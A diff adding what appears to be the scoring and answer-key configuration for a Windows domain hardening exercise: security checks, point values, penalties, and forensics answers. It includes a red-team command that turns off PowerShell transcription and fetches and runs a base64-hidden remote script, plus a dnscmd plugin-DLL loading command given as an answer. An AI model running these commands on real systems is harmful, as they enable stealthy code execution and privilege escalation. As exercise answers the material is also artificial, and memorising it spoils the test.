@@ -1,0 +1,1018 @@
+{
+  "platform": 0,
+  "checks": [
+    {
+      "operation": "eq",
+      "CID": "DNSRoot",
+      "check": "RegistryCheck",
+      "data": {
+        "hive": "HKEY_LOCAL_MACHINE",
+        "key": "SYSTEM\\CurrentControlSet\\Services\\DNS\\**",
+        "value": "*",
+        "architecture": "64"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "Project64Removed",
+      "check": "FSDCheck",
+      "data": {
+        "fsdpath": "Data\\2.fsd",
+        "searchquery": "c:\\program Files (x86)\\*\\*"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "SMBInfo",
+      "check": "SMBServerCheck",
+      "data": {}
+    },
+    {
+      "operation": "eq",
+      "CID": "SMBRoot",
+      "check": "RegistryCheck",
+      "data": {
+        "hive": "HKEY_LOCAL_MACHINE",
+        "key": "SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\**",
+        "value": "*",
+        "architecture": "64"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "environment_tether",
+      "check": "RegistryCheck",
+      "data": {
+        "hive": "HKEY_LOCAL_MACHINE",
+        "key": "SYSTEM\\CurrentControlSet\\Services\\*",
+        "value": "*",
+        "architecture": "64"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "ADAuthP",
+      "check": "ADAuthCheck",
+      "data": {
+        "server": "mushroom.kingdom",
+        "username": "Peach",
+        "password": "mario"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "DSHeuristics",
+      "check": "ADDSHeuristicsCheck",
+      "data": {
+        "searchbase": "CN = Directory Service, CN = Windows NT, CN = Services, CN = Configuration, DC = mushroom, DC = kingdom"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "LSAPPL",
+      "check": "RegistryCheck",
+      "data": {
+        "hive": "HKEY_LOCAL_MACHINE",
+        "key": "SYSTEM\\CurrentControlSet\\Control\\*",
+        "value": "*",
+        "architecture": "64"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "ADUAC",
+      "check": "ADUACCheck",
+      "data": {
+        "searchbase": "CN=Users,DC=mushroom,DC=kingdom"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "DSACLS",
+      "check": "DSACLSCheck",
+      "data": {
+        "searchbase": "DC=mushroom,DC=kingdom"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "GroupChecksums",
+      "check": "ADGMChecksumCheck",
+      "data": {
+        "searchbase": "CN=Users,DC=mushroom,DC=kingdom"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "System32FSD",
+      "check": "FSDCheck",
+      "data": {
+        "fsdpath": "Data\\0.fsd",
+        "searchquery": "C:\\Windows\\sysnative\\*\\*"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "System64FSD",
+      "check": "FSDCheck",
+      "data": {
+        "fsdpath": "Data\\1.fsd",
+        "searchquery": "C:\\Windows\\system32\\*\\*"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "WindowsFSD",
+      "check": "FSDCheck",
+      "data": {
+        "fsdpath": "Data\\3.fsd",
+        "searchquery": "C:\\Windows\\*"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "WSMan",
+      "check": "WSManStatCheck",
+      "data": {}
+    },
+    {
+      "operation": "eq",
+      "CID": "InternOU",
+      "check": "ADOUUsersCheck",
+      "data": {
+        "searchbase": "OU=IT Interns,DC=mushroom,DC=kingdom"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "GPInf",
+      "check": "SecEditCheck",
+      "data": {}
+    },
+    {
+      "operation": "eq",
+      "CID": "IIS",
+      "check": "IISConfigCheck",
+      "data": {
+        "root": "system.webServer",
+        "props": "enabled;errorMode"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "SSLContent",
+      "check": "SSLContentCheck",
+      "data": {
+        "contentpath": "https://127.0.0.1/data/donotdelete.txt"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "EveryonePrivs",
+      "check": "SIDPrivsCheck",
+      "data": {
+        "sid": "S-1-1-0"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "SQLAudit",
+      "check": "MSSQLLASCheck",
+      "data": {}
+    },
+    {
+      "operation": "eq",
+      "CID": "SQLPerms",
+      "check": "MSSQLPermsCheck",
+      "data": {
+        "usercsv": "MUSHROOM\\Mario,MUSHROOM\\Luigi,MUSHROOM\\Wario,MUSHROOM\\Yoshi,MUSHROOM\\Peach,MUSHROOM\\Toad,MUSHROOM\\Lakitu,MUSHROOM\\Hoot,MUSHROOM\\Koopa,MUSHROOM\\MIPS,MUSHROOM\\Dorrie,MUSHROOM\\Tuxie,MUSHROOM\\Eyerok"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "SQLAuth",
+      "check": "MSSQLSAMCheck",
+      "data": {}
+    },
+    {
+      "operation": "eq",
+      "CID": "UserPenalties",
+      "check": "RequiredUsersCheck",
+      "data": {
+        "usercsv": "Luigi,Toad,Wario,Yoshi,Lakitu,Hoot,Koopa,MIPS,Dorrie,Tuxie,Eyerok,Mario,Peach"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "ServicePenalties",
+      "check": "CriticalServiceStateCheck",
+      "data": {
+        "servicecsv": "MSSQL$MKSSQL,DNS,W3SVC"
+      }
+    },
+    {
+      "operation": "eq",
+      "CID": "RedTeam",
+      "check": "TCPRedTeamCheck",
+      "data": {
+        "commandline": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" /v EnableTranscripting /d 0 /f\r\npowershell.exe -ep bypass -noprofile \"IEX (New-Object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jvd3NlcjEzMzcvc2VjcmV0LXNjcmlwdC9tYXN0ZXIvR29vbWJhc1dyYXRoLnBzMQ==')))\"\r\n",
+        "ip": "127.0.0.1",
+        "port": "443"
+      }
+    }
+  ],
+  "scoring": [
+    {
+      "points": 0,
+      "query": [
+        "environment_tether"
+      ],
+      "constraints": [],
+      "answer": "hkey_local_machine\\system\\currentcontrolset\\services\\magistrate\\env+82020",
+      "answercid": "environment_tether",
+      "CI2": "0fJJa8D0"
+    },
+    {
+      "points": 1,
+      "query": [
+        "Project64Removed",
+        "ADDSHeuristicsCheck",
+        "ADAuthCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Project 64 has been <span style=' color:{{POINTCOLOR}};'>removed</span>! ({{CI2}})",
+      "answer": "#|fnv1a|c:\\program files (x86)\\project64 2.3\\project64.exe",
+      "answercid": "Project64Removed",
+      "CI2": "P64czx97"
+    },
+    {
+      "points": 5,
+      "query": [
+        "RegistryCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;DNS SIGRed workaround <span style=' color:{{POINTCOLOR}};'>applied</span>! ({{CI2}})",
+      "answer": "hkey_local_machine\\system\\currentcontrolset\\services\\dns\\parameters\\tcpreceivepacketsize+65280",
+      "answercid": "DNSRoot",
+      "CI2": "SIGRedXD"
+    },
+    {
+      "points": 3,
+      "query": [
+        "SMBServerCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;SMBv1 is <span style=' color:{{POINTCOLOR}};'>disabled</span>! ({{CI2}})",
+      "answer": "enablesmb1protocol:false",
+      "answercid": "SMBInfo",
+      "CI2": "SMBuWuce"
+    },
+    {
+      "points": 5,
+      "query": [
+        "RegistryCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;SMB Compression is <span style=' color:{{POINTCOLOR}};'>disabled</span>! ({{CI2}})",
+      "answer": "hkey_local_machine\\system\\currentcontrolset\\services\\lanmanserver\\parameters\\disablecompression+1",
+      "answercid": "SMBRoot",
+      "CI2": "SMBu4Tyi"
+    },
+    {
+      "points": 2,
+      "query": [
+        "SMBServerCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;SMB server wide encryption is <span style=' color:{{POINTCOLOR}};'>enabled</span>! ({{CI2}})",
+      "answer": "encryptdata:true",
+      "answercid": "SMBInfo",
+      "CI2": "SMBekf2v"
+    },
+    {
+      "points": 3,
+      "query": [
+        "FileNotExistsCheck",
+        "ADDSHeuristicsCheck",
+        "ADAuthCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:RIPhgY2E"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Peach's password has been <span style=' color:{{POINTCOLOR}};'>invalidated</span>! ({{CI2}})",
+      "answer": "peach::mario::31",
+      "answercid": "ADAuthP",
+      "CI2": "PPWv9Emg"
+    },
+    {
+      "points": 6,
+      "query": [
+        "RegistryCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Additional LSA protection <span style=' color:{{POINTCOLOR}};'>enabled</span>! ({{CI2}})",
+      "answer": "hkey_local_machine\\system\\currentcontrolset\\control\\lsa\\runasppl+1",
+      "answercid": "LSAPPL",
+      "CI2": "LSAGOOD1"
+    },
+    {
+      "points": 6,
+      "query": [
+        "DSACLSCheck",
+        "ADDSHeuristicsCheck",
+        "ADAuthCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Anonymous LDAP bind is <span style=' color:{{POINTCOLOR}};'>disabled</span>! ({{CI2}})",
+      "answer": "dsh:7:0",
+      "answercid": "DSHeuristics",
+      "CI2": "LDAPnEE1"
+    },
+    {
+      "points": 7,
+      "query": [
+        "ADUACCheck",
+        "ADDSHeuristicsCheck",
+        "ADAuthCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:BiggR33n"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Luigi's Kerberos Pre-Authentication is <span style=' color:{{POINTCOLOR}};'>enabled</span>! ({{CI2}})",
+      "answer": "luigi:4194304:false",
+      "answercid": "ADUAC",
+      "CI2": "KERuP4dD"
+    },
+    {
+      "points": 1,
+      "query": [
+        "ADUACCheck",
+        "ADDSHeuristicsCheck",
+        "ADAuthCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:RIPhgY2E"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Peach's password is set to <span style=' color:{{POINTCOLOR}};'>expire</span>! ({{CI2}})",
+      "answer": "peach:65536:false",
+      "answercid": "ADUAC",
+      "CI2": "PEACH69z"
+    },
+    {
+      "points": 5,
+      "query": [
+        "DSACLSCheck",
+        "ADDSHeuristicsCheck",
+        "ADUACCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Peach's 'Replicating Directory Changes All' role has been <span style=' color:{{POINTCOLOR}};'>revoked</span>! ({{CI2}})",
+      "answer": "u:deny:mushroom\\peach:replicating directory changes all",
+      "answercid": "DSACLS",
+      "CI2": "REPds79o"
+    },
+    {
+      "points": 2,
+      "query": [],
+      "stateless": true,
+      "constraints": [
+        "or:asFF76ss",
+        "or:jjFUsh89"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;List of users in the 'Domain Admins' group is <span style=' color:{{POINTCOLOR}};'>correct</span>! ({{CI2}})",
+      "answer": "NDA8eef9",
+      "answercid": "#",
+      "CI2": "NDA8eef9"
+    },
+    {
+      "points": 0,
+      "query": [
+        "ADGMChecksumCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:TOADTOAD"
+      ],
+      "message": "NDA8eef9",
+      "answer": "domain admins:administrator:luigi:mario",
+      "answercid": "GroupChecksums",
+      "CI2": "asFF76ss"
+    },
+    {
+      "points": 0,
+      "query": [
+        "ADGMChecksumCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:TOADTOAD"
+      ],
+      "message": "NDA8eef9",
+      "answer": "domain admins:luigi:mario",
+      "answercid": "GroupChecksums",
+      "CI2": "jjFUsh89"
+    },
+    {
+      "points": 5,
+      "query": [
+        "FSDCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;inetinfo.exe bind shell <span style=' color:{{POINTCOLOR}};'>removed</span>! ({{CI2}})",
+      "answer": "#|fnv1a|C:\\Windows\\Sysnative\\Inetinfo.exe",
+      "answercid": "System32FSD",
+      "CI2": "NCEZ01vF"
+    },
+    {
+      "points": 6,
+      "query": [
+        "FSDCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "and:jG73mnF1",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Mimikatz DnsServerPluginDll has been <span style=' color:{{POINTCOLOR}};'>removed</span>! ({{CI2}})",
+      "answer": "#|fnv1a|C:\\Windows\\Sysnative\\mkxproxyloader.dll",
+      "answercid": "System32FSD",
+      "CI2": "KATzzz99"
+    },
+    {
+      "points": 0,
+      "query": [
+        "FSDCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "answer": "#|fnv1a|c:\\windows\\system32\\mksproxy.dll",
+      "answercid": "System64FSD",
+      "CI2": "jG73mnF1"
+    },
+    {
+      "points": 5,
+      "query": [
+        "WSManStatCheck",
+        "ADOUUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Powershell remoting has been <span style=' color:{{POINTCOLOR}};'>disabled</span>! ({{CI2}})",
+      "answer": "psremotingtransportexception",
+      "answercid": "WSMan",
+      "CI2": "RPSc92Q8"
+    },
+    {
+      "points": 2,
+      "query": [
+        "ADOUUsersCheck",
+        "WSManStatCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;IT Intern OU has been <span style=' color:{{POINTCOLOR}};'>populated</span>! ({{CI2}})",
+      "answer": "user:toad",
+      "answercid": "InternOU",
+      "CI2": "ITOUbonk"
+    },
+    {
+      "points": 2,
+      "query": [
+        "SecEditCheck",
+        "SIDPrivsCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Password complexity requirements have been <span style=' color:{{POINTCOLOR}};'>enabled</span>! ({{CI2}})",
+      "answer": "passwordcomplexity:1",
+      "answercid": "GPInf",
+      "CI2": "PWCghfE9"
+    },
+    {
+      "points": 2,
+      "query": [
+        "SecEditCheck",
+        "IISConfigCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:WWW8gJse"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;IIS Directory Browsing is <span style=' color:{{POINTCOLOR}};'>disabled</span>! ({{CI2}})",
+      "answer": "directorybrowse:enabled:false",
+      "answercid": "IIS",
+      "CI2": "IDBmQe09"
+    },
+    {
+      "points": 2,
+      "query": [],
+      "stateless": true,
+      "constraints": [
+        "or:IfBmXee9",
+        "or:ccBcce09"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;IIS Detailed HTTP Errors is <span style=' color:{{POINTCOLOR}};'>disabled</span>! ({{CI2}})",
+      "answer": "IDEvs17r",
+      "answercid": "#",
+      "CI2": "IDEvs17r"
+    },
+    {
+      "points": 0,
+      "query": [
+        "SecEditCheck",
+        "IISConfigCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:WWW8gJse"
+      ],
+      "message": "IDEvs17r",
+      "answer": "httperrors:errormode:detailedlocalonly",
+      "answercid": "IIS",
+      "CI2": "IfBmXee9"
+    },
+    {
+      "points": 0,
+      "query": [
+        "SecEditCheck",
+        "IISConfigCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:WWW8gJse"
+      ],
+      "message": "IDEvs17r",
+      "answer": "httperrors:errormode:custom",
+      "answercid": "IIS",
+      "CI2": "ccBcce09"
+    },
+    {
+      "points": 5,
+      "query": [
+        "WindowsFSD",
+        "SIDPrivsCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;PSExec backdoor has been <span style=' color:{{POINTCOLOR}};'>removed</span>! ({{CI2}})",
+      "answer": "#|fnv1a|c:\\windows\\dYSZrOCn.exe",
+      "answercid": "WindowsFSD",
+      "CI2": "PSEl9qZi"
+    },
+    {
+      "points": 2,
+      "query": [
+        "SSLContentCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:WWW8gJse"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;IIS HTTPS binding has been <span style=' color:{{POINTCOLOR}};'>configured</span>! ({{CI2}})",
+      "answer": "shoutouts to simpleflips",
+      "answercid": "SSLContent",
+      "CI2": "TLSjjwfC"
+    },
+    {
+      "points": 3,
+      "query": [
+        "SIDPrivsCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Everyone's 'Trusted for Delegation' right has been <span style=' color:{{POINTCOLOR}};'>revoked</span>! ({{CI2}})",
+      "answer": "seenabledelegationprivilege:false",
+      "answercid": "EveryonePrivs",
+      "CI2": "UDDaeiou"
+    },
+    {
+      "points": 1,
+      "query": [],
+      "stateless": true,
+      "constraints": [
+        "or:SSLau111",
+        "or:SSLau222",
+        "or:SSLau333"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;SQL Server login auditing <span style=' color:{{POINTCOLOR}};'>configured</span>! ({{CI2}})",
+      "answer": "SSLauE6b",
+      "answercid": "#",
+      "CI2": "SSLauE6b"
+    },
+    {
+      "points": 0,
+      "query": [
+        "MSSQLLASCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:SQLnVue4"
+      ],
+      "message": "SSLauE6b",
+      "answer": "failure",
+      "answercid": "SQLAudit",
+      "CI2": "SSLau111"
+    },
+    {
+      "points": 0,
+      "query": [
+        "MSSQLLASCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:SQLnVue4"
+      ],
+      "message": "SSLauE6b",
+      "answer": "success",
+      "answercid": "SQLAudit",
+      "CI2": "SSLau222"
+    },
+    {
+      "points": 0,
+      "query": [
+        "MSSQLLASCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:SQLnVue4"
+      ],
+      "message": "SSLauE6b",
+      "answer": "all",
+      "answercid": "SQLAudit",
+      "CI2": "SSLau333"
+    },
+    {
+      "points": 4,
+      "query": [
+        "MSSQLPermsCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:SQLnVue4"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Yoshi's 'CONTROL SERVER' SQL permission was <span style=' color:{{POINTCOLOR}};'>removed</span>! ({{CI2}})",
+      "answer": "mushroom\\yoshi:control server:false",
+      "answercid": "SQLPerms",
+      "CI2": "YDbwD838"
+    },
+    {
+      "points": 3,
+      "query": [
+        "MSSQLSAMCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:SQLnVue4"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;SQL server 'Require Integrated Security' <span style=' color:{{POINTCOLOR}};'>configured</span>! ({{CI2}})",
+      "answer": "isintegratedsecurityonly:true",
+      "answercid": "SQLAuth",
+      "CI2": "SWAi3mm2"
+    },
+    {
+      "points": -12,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Mario' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "mario:false",
+      "answercid": "UserPenalties",
+      "CI2": "b1GredUc"
+    },
+    {
+      "points": -12,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Luigi' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "luigi:false",
+      "answercid": "UserPenalties",
+      "CI2": "BiggR33n"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Wario' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "wario:false",
+      "answercid": "UserPenalties",
+      "CI2": "waRdie00"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Yoshi' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "yoshi:false",
+      "answercid": "UserPenalties",
+      "CI2": "SHEm120x"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Peach' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "peach:false",
+      "answercid": "UserPenalties",
+      "CI2": "RIPhgY2E"
+    },
+    {
+      "points": -12,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Toad' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "toad:false",
+      "answercid": "UserPenalties",
+      "CI2": "TOADTOAD"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Lakitu' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "lakitu:false",
+      "answercid": "UserPenalties",
+      "CI2": "LTUXn82n"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Hoot' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "hoot:false",
+      "answercid": "UserPenalties",
+      "CI2": "WHOs8gh2"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Koopa' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "koopa:false",
+      "answercid": "UserPenalties",
+      "CI2": "KTQle6nG"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'MIPS' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "mips:false",
+      "answercid": "UserPenalties",
+      "CI2": "BUN0idLl"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Dorrie' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "dorrie:false",
+      "answercid": "UserPenalties",
+      "CI2": "BLUiiiu4"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Tuxie' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "tuxie:false",
+      "answercid": "UserPenalties",
+      "CI2": "TUXctfog"
+    },
+    {
+      "points": -8,
+      "query": [
+        "RequiredUsersCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0",
+        "not:DNSnoDnS"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Authorized user 'Eyerok' <span style=' color:{{POINTCOLOR}};'>damaged or removed</span>! ({{CI2}})",
+      "answer": "eyerok:false",
+      "answercid": "UserPenalties",
+      "CI2": "EYEh4NDs"
+    },
+    {
+      "points": -20,
+      "query": [
+        "CriticalServiceStateCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;MS SQL Server Service is <span style=' color:{{POINTCOLOR}};'>unavailable</span>! ({{CI2}})",
+      "answer": "mssql$mkssql:false",
+      "answercid": "ServicePenalties",
+      "CI2": "SQLnVue4"
+    },
+    {
+      "points": -30,
+      "query": [
+        "CriticalServiceStateCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;IIS Web Service is <span style=' color:{{POINTCOLOR}};'>unavailable</span>! ({{CI2}})",
+      "answer": "w3svc:false",
+      "answercid": "ServicePenalties",
+      "CI2": "WWW8gJse"
+    },
+    {
+      "points": -30,
+      "query": [
+        "CriticalServiceStateCheck"
+      ],
+      "constraints": [
+        "and:0fJJa8D0"
+      ],
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;DNS Server is <span style=' color:{{POINTCOLOR}};'>unavailable</span>! ({{CI2}})",
+      "answer": "dns:false",
+      "answercid": "ServicePenalties",
+      "CI2": "DNSnoDnS"
+    }
+  ],
+  "forensics": [
+    {
+      "id": 0,
+      "points": 4,
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Forensics Question 1 <span style=' color:{{POINTCOLOR}};'>correct</span>! ({{CI2}})",
+      "answers": [
+        {
+          "value": "S-1-5-21-2784171390-1266567518-1641001447-1601",
+          "type": 3,
+          "format": "^S-\\d-\\d+-(\\d+-){1,14}\\d+$",
+          "label": "User SID"
+        }
+      ],
+      "flags": [
+        "ignorecase",
+        "ignorews"
+      ],
+      "question": "According to Kingdom Management, suspicious activity appeared under a user that no longer exists.<br><br>What is the SID (Security Identifier) of the deleted user?<br><br>EXAMPLE: S-1-5-21-1234567890-123456789-1234567890-2019",
+      "CI2": "FQ1c0uIy"
+    },
+    {
+      "id": 1,
+      "points": 6,
+      "message": "(<span style=' color:{{POINTCOLOR}};'>{{POINTS}}</span>)&nbsp;Forensics Question 2 <span style=' color:{{POINTCOLOR}};'>correct</span>! ({{CI2}})",
+      "answers": [
+        {
+          "value": "dnscmd mushroom.kingdom /config /serverlevelplugindll C:\\Windows\\System32\\mkxproxyloader.dll",
+          "type": 3,
+          "format": "^.+$",
+          "label": "Command"
+        }
+      ],
+      "flags": [
+        "ignorecase",
+        "ignorews"
+      ],
+      "question": "Under the same deleted user, a specific command was used to escalate privileges and leak user information.<br><br>What command was run to load this escalation mechanism?<br><br>EXAMPLE: accesschk.exe /accepteula -uwcqv 'Authenticated Users' *",
+      "CI2": "FQ2EnCx8"
+    },
+    {
+      "id": 2,
+      "points": 8,
